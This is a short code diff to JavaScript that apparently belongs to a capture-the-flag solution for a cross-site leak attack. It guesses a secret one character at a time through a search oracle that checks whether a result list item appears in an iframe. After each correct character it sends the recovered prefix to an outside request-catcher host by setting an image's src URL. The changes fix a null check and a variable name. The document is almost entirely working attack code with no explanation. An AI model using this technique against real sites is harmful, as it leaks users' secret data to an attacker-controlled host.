@@ -9,7 +9,7 @@
                 var divElement = iframe.querySelector('.sentence-list');
                 var ulElement = divElement.querySelector('ul');
                 var liElement = ulElement.querySelector('li');
-                if (liElement != 0)
+                if (liElement !== null)
                     return resolve();
                 else
                     return reject();
@@ -33,7 +33,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    imgElement.src = `https://rcwdntp.request.dreamhack.games/${secret}`;
+                    img.src = `https://rcwdntp.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
